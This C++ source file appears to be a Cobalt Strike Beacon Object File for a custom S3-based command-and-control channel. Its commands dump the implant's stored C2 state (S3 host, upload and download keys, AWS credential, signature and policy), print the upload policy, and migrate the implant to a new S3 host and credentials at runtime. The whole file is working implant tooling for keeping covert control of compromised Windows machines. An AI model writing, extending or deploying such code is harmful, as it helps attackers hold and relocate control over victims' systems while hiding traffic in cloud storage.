#include <windows.h>
#include <winhttp.h>
#include <intrin.h>
#include <stdint.h>
#include <assert.h>

#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

#include "beacon.h"
#include "s3-udc2.h"
#include "s3-config.h"
#include "base/helpers.h"

#define memset(src, val, size) __stosb((PBYTE)(src), (val), (size))
#define memcpy(dst, src, n)    __movsb((unsigned char*)(dst), (const unsigned char*)(src), (n))

typedef enum {
	Dump,
	Migrate,
	Policy
} Action;

typedef enum {
	KindMaxFrameEntries,
	KindFrameRetryDelay,
	KindHost,
	KindUploadKey,
	KindXAmzCredential,
	KindXAmzDate,
	KindXAmzSignature,
	KindXAmzPolicy,
	KindDownloadUrl,
	KindUserAgent, // TODO
} ConfigKind;

extern "C" {

void dumpState() {
#ifdef C2_STATE_KEY
	C2State* S = (C2State*)BeaconGetValue(C2_STATE_KEY);
	if (!S) {
		const char msg[] = "Could not find the state object";
		BeaconOutput(CALLBACK_ERROR, msg, sizeof(msg) - 1);
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT,
		"State:\n"
		"\tSessionId:            %s\n"
		"\tNonce:                %llu\n"
		"\tMax Frame Retries:    %i\n"
		"\tFrame Retry Delay:    %i ms\n"
		"S3 Info:\n"
		"\tS3 Host:              %S\n"
		"\tS3 Download Key:      %s\n"
		"\tS3 Upload Key:        %s\n"
		"\tS3 Auth Info:\n"
		"\t\tx-amz-credential:   %s\n"
		"\t\tx-amz-date:         %s\n"
		"\t\tx-amz-signature:    %s\n"
		"\t\tPolicy:             %s\n",
		S->sessionId,
		S->nonce,
		S->maxFrameRetries,
		S->frameRetryDelayMs,
		S->s3.host,
		S->s3.downloadKey,
		S->s3.uploadKey,
		S->s3.xAmzCredential,
		S->s3.xAmzDate,
		S->s3.xAmzSignature,
		S->s3.xAmzPolicy
	);
#else
	const char msg[] = "Not supported";
	BeaconOutput(CALLBACK_ERROR, msg, sizeof(msg) - 1);
#endif
}

void dumpPolicy() {
#ifdef C2_STATE_KEY
	C2State* S = (C2State*)BeaconGetValue(C2_STATE_KEY);
	if (!S) {
		const char msg[] = "Could not find the state object";
		BeaconOutput(CALLBACK_ERROR, msg, sizeof(msg) - 1);
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "%s", S->s3.xAmzPolicy);
#else
	const char msg[] = "Not supported";
	BeaconOutput(CALLBACK_ERROR, msg, sizeof(msg) - 1);
#endif
}

bool BeaconDataExtractSafe(datap* p, char* buff, size_t len) {
	size_t dataLen = (size_t)BeaconDataInt(p);
	const char* data = BeaconDataPtr(p, dataLen);
	if (dataLen <= len) {
		memcpy(buff, data, dataLen);
		return true;
	}
	return false;
}

void migrateState(datap* p) {
#ifdef C2_STATE_KEY
	C2State* S = (C2State*)BeaconGetValue(C2_STATE_KEY);
	if (!S) {
		const char msg[] = "Could not find the state object";
		BeaconOutput(CALLBACK_ERROR, msg, sizeof(msg) - 1);
		return;
	}

	int entries = BeaconDataInt(p);
	BeaconPrintf(CALLBACK_OUTPUT, "Changing %i entries, see you on the other side...", entries);
	while (entries--) {
		ConfigKind kind = (ConfigKind)BeaconDataInt(p);
		if      (kind == ConfigKind::KindFrameRetryDelay) S->frameRetryDelayMs = BeaconDataInt(p);
		else if (kind == ConfigKind::KindMaxFrameEntries) S->maxFrameRetries   = BeaconDataInt(p);
		else if (kind == ConfigKind::KindHost)            BeaconDataExtractSafe(p, (char*)S->s3.host,    sizeof(S->s3.host));
		else if (kind == ConfigKind::KindUploadKey)       BeaconDataExtractSafe(p, S->s3.uploadKey,      sizeof(S->s3.uploadKey));
		else if (kind == ConfigKind::KindXAmzCredential)  BeaconDataExtractSafe(p, S->s3.xAmzCredential, sizeof(S->s3.xAmzCredential));
		else if (kind == ConfigKind::KindXAmzDate)        BeaconDataExtractSafe(p, S->s3.xAmzDate,       sizeof(S->s3.xAmzDate));
		else if (kind == ConfigKind::KindXAmzSignature)   BeaconDataExtractSafe(p, S->s3.xAmzSignature,  sizeof(S->s3.xAmzSignature));
		else if (kind == ConfigKind::KindXAmzPolicy)      BeaconDataExtractSafe(p, S->s3.xAmzPolicy,     sizeof(S->s3.xAmzPolicy));
		else if (kind == ConfigKind::KindDownloadUrl)     BeaconDataExtractSafe(p, S->s3.downloadKey,    sizeof(S->s3.downloadKey));
	}
	BeaconPrintf(CALLBACK_OUTPUT, "Done!");
#else
	const char msg[] = "Not supported";
	BeaconOutput(CALLBACK_ERROR, msg, sizeof(msg) - 1);
#endif
}

void go(char* args, int len) {
	datap p;
	BeaconDataParse(&p, args, len);
	Action action = (Action)BeaconDataInt(&p);

	if (action == Action::Dump) dumpState();
	else if (action == Migrate) migrateState(&p);
	else if (action == Policy) dumpPolicy();
	else BeaconPrintf(CALLBACK_ERROR, "Unknown action: %i", action);
}

}
